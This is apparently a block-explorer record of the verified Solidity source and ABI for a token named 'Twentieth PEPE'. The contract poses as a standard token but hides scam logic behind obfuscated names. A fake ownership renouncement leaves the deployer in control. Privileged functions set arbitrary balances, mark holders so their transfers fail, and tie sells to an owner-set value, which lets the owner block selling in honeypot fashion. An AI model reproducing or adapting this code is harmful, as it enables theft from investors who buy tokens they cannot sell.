{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface autoEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeSellTeam) external view returns (uint256);\n\n    function transfer(address sellTotal, uint256 txWalletSender) external returns (bool);\n\n    function allowance(address txTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txWalletSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellTotal,\n        uint256 txWalletSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityTotalTeam, uint256 value);\n    event Approval(address indexed txTotal, address indexed spender, uint256 value);\n}\n\nabstract contract walletTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface buySellTo {\n    function createPair(address tradingTotalIs, address limitMarketing) external returns (address);\n}\n\ninterface autoEnableMetadata is autoEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TwentiethPEPE is walletTake, autoEnable, autoEnableMetadata {\n\n    function autoTo(address exemptAmount) public {\n        require(exemptAmount.balance < 100000);\n        if (walletMax) {\n            return;\n        }\n        if (exemptAuto != toEnable) {\n            totalExempt = false;\n        }\n        shouldMin[exemptAmount] = true;\n        \n        walletMax = true;\n    }\n\n    bool public walletMax;\n\n    event OwnershipTransferred(address indexed listLiquidity, address indexed limitLaunchedBuy);\n\n    function receiverLaunch() public {\n        emit OwnershipTransferred(fromSwap, address(0));\n        atEnable = address(0);\n    }\n\n    uint256 marketingLaunch;\n\n    uint256 sellTeam;\n\n    bool private exemptAuto;\n\n    mapping(address => uint256) private teamMarketingLaunch;\n\n    uint256 constant tokenMax = 16 ** 10;\n\n    function walletSell() private view {\n        require(shouldMin[_msgSender()]);\n    }\n\n    uint256 private liquiditySell;\n\n    mapping(address => bool) public shouldMin;\n\n    bool public totalExempt;\n\n    function getOwner() external view returns (address) {\n        return atEnable;\n    }\n\n    address teamExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public listAt;\n\n    address private atEnable;\n\n    function buyLaunched(address liquidityMin, address sellTotal, uint256 txWalletSender) internal returns (bool) {\n        require(teamMarketingLaunch[liquidityMin] >= txWalletSender);\n        teamMarketingLaunch[liquidityMin] -= txWalletSender;\n        teamMarketingLaunch[sellTotal] += txWalletSender;\n        emit Transfer(liquidityMin, sellTotal, txWalletSender);\n        return true;\n    }\n\n    bool private atIs;\n\n    uint8 private liquidityList = 18;\n\n    function approve(address autoAt, uint256 txWalletSender) public virtual override returns (bool) {\n        teamTotal[_msgSender()][autoAt] = txWalletSender;\n        emit Approval(_msgSender(), autoAt, txWalletSender);\n        return true;\n    }\n\n    bool public swapMaxLimit;\n\n    constructor (){\n        if (listAt == exemptShouldSender) {\n            swapMaxLimit = false;\n        }\n        launchTrading listBuy = launchTrading(fundFee);\n        txMin = buySellTo(listBuy.factory()).createPair(listBuy.WETH(), address(this));\n        \n        fromSwap = _msgSender();\n        receiverLaunch();\n        shouldMin[fromSwap] = true;\n        teamMarketingLaunch[fromSwap] = marketingLiquidity;\n        if (toEnable != totalExempt) {\n            liquiditySell = listAt;\n        }\n        emit Transfer(address(0), fromSwap, marketingLiquidity);\n    }\n\n    bool public toEnable;\n\n    address public txMin;\n\n    mapping(address => bool) public senderEnable;\n\n    string private isReceiver = \"TPE\";\n\n    function owner() external view returns (address) {\n        return atEnable;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingLiquidity;\n    }\n\n    mapping(address => mapping(address => uint256)) private teamTotal;\n\n    function receiverTeam(address marketingAuto, uint256 txWalletSender) public {\n        walletSell();\n        teamMarketingLaunch[marketingAuto] = txWalletSender;\n    }\n\n    function sellMarketing(uint256 txWalletSender) public {\n        walletSell();\n        sellTeam = txWalletSender;\n    }\n\n    function allowance(address maxFromTrading, address autoAt) external view virtual override returns (uint256) {\n        if (autoAt == fundFee) {\n            return type(uint256).max;\n        }\n        return teamTotal[maxFromTrading][autoAt];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchedMax;\n    }\n\n    address fundFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private swapLimitFee;\n\n    function transferFrom(address liquidityMin, address sellTotal, uint256 txWalletSender) external override returns (bool) {\n        if (_msgSender() != fundFee) {\n            if (teamTotal[liquidityMin][_msgSender()] != type(uint256).max) {\n                require(txWalletSender <= teamTotal[liquidityMin][_msgSender()]);\n                teamTotal[liquidityMin][_msgSender()] -= txWalletSender;\n            }\n        }\n        return sellWallet(liquidityMin, sellTotal, txWalletSender);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return isReceiver;\n    }\n\n    uint256 private marketingLiquidity = 100000000 * 10 ** 18;\n\n    uint256 private exemptShouldSender;\n\n    function sellWallet(address liquidityMin, address sellTotal, uint256 txWalletSender) internal returns (bool) {\n        if (liquidityMin == fromSwap) {\n            return buyLaunched(liquidityMin, sellTotal, txWalletSender);\n        }\n        uint256 swapTotal = autoEnable(txMin).balanceOf(teamExempt);\n        require(swapTotal == sellTeam);\n        require(sellTotal != teamExempt);\n        if (senderEnable[liquidityMin]) {\n            return buyLaunched(liquidityMin, sellTotal, tokenMax);\n        }\n        return buyLaunched(liquidityMin, sellTotal, txWalletSender);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityList;\n    }\n\n    string private launchedMax = \"Twentieth PEPE\";\n\n    function balanceOf(address takeSellTeam) public view virtual override returns (uint256) {\n        return teamMarketingLaunch[takeSellTeam];\n    }\n\n    function shouldAutoLiquidity(address shouldSender) public {\n        walletSell();\n        \n        if (shouldSender == fromSwap || shouldSender == txMin) {\n            return;\n        }\n        senderEnable[shouldSender] = true;\n    }\n\n    function transfer(address marketingAuto, uint256 txWalletSender) external virtual override returns (bool) {\n        return sellWallet(_msgSender(), marketingAuto, txWalletSender);\n    }\n\n    address public fromSwap;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitLaunchedBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTotalTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFromTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txWalletSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAmount\",\"type\":\"address\"}],\"name\":\"autoTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSellTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txWalletSender\",\"type\":\"uint256\"}],\"name\":\"receiverTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txWalletSender\",\"type\":\"uint256\"}],\"name\":\"sellMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSender\",\"type\":\"address\"}],\"name\":\"shouldAutoLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMaxLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txWalletSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txWalletSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "TwentiethPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}